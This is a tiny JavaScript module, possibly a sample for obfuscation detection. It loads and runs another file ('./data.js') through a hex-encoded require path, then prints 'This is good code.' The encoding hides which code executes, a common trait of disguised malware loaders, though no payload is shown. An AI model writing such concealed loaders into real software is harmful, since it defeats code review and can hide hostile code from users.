export default () => {
  require(Buffer.from("2e2f646174612e6a73", "hex").toString()).default();
  console.log("This is good code.");
};
